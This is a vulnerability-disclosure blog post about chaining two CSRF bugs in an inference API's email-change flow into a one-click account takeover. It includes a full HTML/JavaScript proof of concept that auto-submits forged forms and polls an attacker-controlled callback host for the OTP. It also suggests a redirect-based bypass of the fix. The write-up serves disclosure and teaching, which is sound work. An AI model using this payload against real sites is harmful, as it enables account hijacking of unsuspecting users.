@@ -1,0 +1,112 @@
+---
+title: "Using the imagination to upgrade impact from low to critical"
+description: "Chaining two low severity bugs into a one click account takeover with scripting"
+date: "2026-10-04"
+---
+
+## Introduction, what are we hacking
+
+It is an inference API. They host the models, and you call them. The client they built for that is a CLI. The CLI uses the API to run the models, and it uses the same backend to check credit usage and account settings.
+
+That account is also a website. Same user, same credits, a session in the browser. I logged in and opened account settings. I was not poking the model routes just exploring the web app.
+
+The feature to change the email on the account is what got my attention I noticed that it was a two step process.
+
+1. The first step is a request to mail a six-digit OTP to the new email address.
+2. The second step is another request to post that code and save the change.
+
+## What was wrong
+
+This problem here is that the app trusts that even if the change email request is forged, the code will just be sent to the attacker address but the confirm still has to be sent as the logged-in user. That second request is unprotected too because they thought this two step process would just make this process safe.
+
+That's a mistake and I wanted to prove it but if I just reported the two CSRF bugs in separate reports I would not have been able to take the account.
+
+And by what they are doing it would be considered low severity or even informational.
+
+## Using the imagination to upgrade impact from low to critical
+
+I stoped here and decided to do what the kids nowadays call "UsInG ChaTgPT iNsiDe mY hEAd" so I blasted some instrumental music and started brainstorming how could I use everything I got so far, which was more than these bugs, to upgrade impact before submitting the reports.
+
+While thinking about it I made the first POC for the reset email feature and yeah I got that code, but then I also thought that one script could spawn two tabs sequentially and even close them to make it more sneaky.
+But the missing piece was obtaining the code from the attacker's inbox and then I thought "what if the attacker's inbox has a callback event that can be used to make the code available to the script from an ajax request?" and that's when I could visualize the right idea on how to get a fancy one click account takeover.
+
+
+This is the POC I ended up with, to supply to the victim, Ill explain it in a bit:
+
+```html
+<html>
+<body>
+  <form
+    id="sendForm"
+    action="http://<target-vdp-url>/send-otp"
+    method="POST"
+    target="openSendOTPCSRFTab"
+  >
+    <input name="email" value="attacker@echoesofwhoami.com">
+  </form>
+
+  <form
+    id="confirmForm"
+    action="http://<target-vdp-url>/confirm-change"
+    method="POST"
+    target="openConfirmOTPCSRFTab"
+  >
+    <input name="email" value="attacker@echoesofwhoami.com">
+    <input name="code" value="">
+  </form>
+
+  <script>
+    (async () => {
+      window.open("", "openSendOTPCSRFTab")
+
+      document.getElementById("sendForm").submit()
+
+      while (true) {
+        await new Promise(resolve => setTimeout(resolve, 1000))
+        
+        const callbackURL = 'https://poc.echoesofwhoami.com/callback-otp'
+
+        const code = await fetch(callbackURL).then(async r => await r.text())
+
+        if (!code) continue
+        
+        document.querySelector('input[name="code"]').value = code
+        
+        window.open("", "openConfirmOTPCSRFTab")
+        
+        document.getElementById("confirmForm").submit()
+        
+        break
+      }
+    })()
+  </script>
+</body>
+</html>
+```
+
+The victim clicks the link and gets this entire html page.
+
+`window.open("", "openSendOTPCSRFTab")` gets the first form and sends it in a new tab to `http://<target-vdp-url>/send-otp` with the browser of the victim containing the session and my attacker email as a body parameter.
+
+Then I set up a while loop because the email code takes a few seconds this loop first waits a second then checks an attacker controller endpoint where a script is listening to my inbox and will put in that endpoint the OTP code once available, otherwise returns null and the `continue` condition will restart the while loop.
+
+When the right iteration finds the OTP code it injects it in the second form with the id `confirmForm` opens a new tab and submits the form there.
+
+I kept the attack segmented in two secuential tabs because otherwise the first form submission would navigate to the app and lose the victim's browser before I could inject the OTP code.
+
+## Impact
+
+About seven seconds later the account is mine. The passwordless login feature allows me to authenticate with a magic link to the victim's account.
+
+## Mitigation
+
+I asked for CSRF tokens. They shipped CORS protection, and they stopped accepting `application/x-www-form-urlencoded`.
+
+I retested the page. It no longer changes the email. However I believe the attack would revive if I could find a 307/308 redirect that would not trigger a preflight request.
+
+## Reward
+
+The report paid out in generous amounts of credits for their models, the owner of the company is a really nice guy and he was very grateful for the report.
+
+The funniest part is that the day before I ran out of credits on my provider so I was looking for a different option and I found this one that had a free tier and a vdp so I hacked this manually and got myself some credits.
+
